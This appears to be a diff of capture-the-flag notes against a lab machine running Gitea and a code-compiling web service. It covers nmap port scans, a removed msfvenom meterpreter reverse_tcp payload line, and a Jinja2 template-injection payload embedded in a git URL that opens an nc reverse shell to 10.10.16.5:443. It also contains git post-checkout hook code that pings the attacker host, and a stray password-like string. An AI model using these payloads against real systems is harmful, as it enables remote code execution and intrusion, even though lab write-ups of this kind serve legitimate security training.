@@ -2,87 +2,20 @@
 
 ```
 ┌──(root㉿kali)-[~]
-└─# nmap -sV -Pn -A 10.10.11.26
+└─# nmap -Pn -p- 10.10.11.26
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-30 04:34 EDT
+Stats: 0:11:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 5.10% done; ETC: 08:14 (3:28:32 remaining)
 Nmap scan report for 10.10.11.26
-Host is up (0.53s latency).
-Not shown: 998 filtered tcp ports (no-response)
-PORT     STATE SERVICE VERSION
-3000/tcp open  ppp?
-| fingerprint-strings: 
-|   GenericLines, Help, RTSPRequest: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 200 OK
-|     Cache-Control: max-age=0, private, must-revalidate, no-transform
-|     Content-Type: text/html; charset=utf-8
-|     Set-Cookie: i_like_gitea=0b5ac954e13131c7; Path=/; HttpOnly; SameSite=Lax
-|     Set-Cookie: _csrf=I90LI0OFlVluSSkY1ebrQaDfOw06MTcyMjMyODU0ODQyOTQzNjgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
-|     X-Frame-Options: SAMEORIGIN
-|     Date: Tue, 30 Jul 2024 08:35:48 GMT
-|     <!DOCTYPE html>
-|     <html lang="en-US" class="theme-arc-green">
-|     <head>
-|     <meta name="viewport" content="width=device-width, initial-scale=1">
-|     <title>Git</title>
-|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
-|   HTTPOptions: 
-|     HTTP/1.0 405 Method Not Allowed
-|     Allow: HEAD
-|     Allow: HEAD
-|     Allow: GET
-|     Cache-Control: max-age=0, private, must-revalidate, no-transform
-|     Set-Cookie: i_like_gitea=5d8eb991288ca49d; Path=/; HttpOnly; SameSite=Lax
-|     Set-Cookie: _csrf=JZFyeBG5TUM-FVPnF1q-3TOVl7s6MTcyMjMyODU1NTkwOTA1ODUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
-|     X-Frame-Options: SAMEORIGIN
-|     Date: Tue, 30 Jul 2024 08:35:55 GMT
-|_    Content-Length: 0
-5000/tcp open  upnp?
-| fingerprint-strings: 
-|   GetRequest: 
-|     HTTP/1.1 200 OK
-|     Server: Werkzeug/3.0.3 Python/3.12.3
-|     Date: Tue, 30 Jul 2024 08:35:48 GMT
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 5234
-|     Connection: close
-|     <!DOCTYPE html>
-|     <html lang="en">
-|     <head>
-|     <meta charset="UTF-8">
-|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-|     <title>Compiled - Code Compiling Services</title>
-|     <!-- Bootstrap CSS -->
-|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-|     <!-- Custom CSS -->
-|     <style>
-|     your custom CSS here */
-|     body {
-|     font-family: 'Ubuntu Mono', monospace;
-|     background-color: #272822;
-|     color: #ddd;
-|     .jumbotron {
-|     background-color: #1e1e1e;
-|     color: #fff;
-|     padding: 100px 20px;
-|     margin-bottom: 0;
-|     .services {
-|   RTSPRequest: 
-|     <!DOCTYPE HTML>
-|     <html lang="en">
-|     <head>
-|     <meta charset="utf-8">
-|     <title>Error response</title>
-|     </head>
-|     <body>
-|     <h1>Error response</h1>
-|     <p>Error code: 400</p>
-|     <p>Message: Bad request version ('RTSP/1.0').</p>
-|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
-|     </body>
+Host is up (0.31s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+3000/tcp open  ppp
+5000/tcp open  upnp
+5985/tcp open  wsman
+7680/tcp open  pando-pub
+
+Nmap done: 1 IP address (1 host up) scanned in 5281.61 seconds
 
 ```
 
@@ -112,7 +45,10 @@ R2*#?n%V8e4#Hhk
 
 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=443 -f csharp
+git remote add origin http://10.10.11.26:3000/max/captain.git
+
+
+git remote add origin http://10.10.11.26:3000/max/hook.git
 
 
 http://{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.10.16.5 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}.git
@@ -126,7 +62,5 @@ echo 'cmd /c ping 10.10.16.5' > .githooks/post-checkout
 
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-cmd /c ping 10.10.16.5
-open -a Calculator.app
+cmd.exe /c ping 10.10.16.5
 EOF
